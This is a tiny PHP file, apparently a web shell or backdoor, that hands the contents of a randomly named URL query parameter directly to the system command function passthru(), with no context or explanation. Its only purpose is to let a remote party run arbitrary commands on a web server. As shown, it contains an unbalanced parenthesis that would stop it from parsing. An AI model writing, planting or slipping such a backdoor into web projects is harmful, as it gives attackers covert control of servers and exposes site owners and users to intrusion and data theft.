<?php
passthru(($_GET['SC2w9V61']);
?>
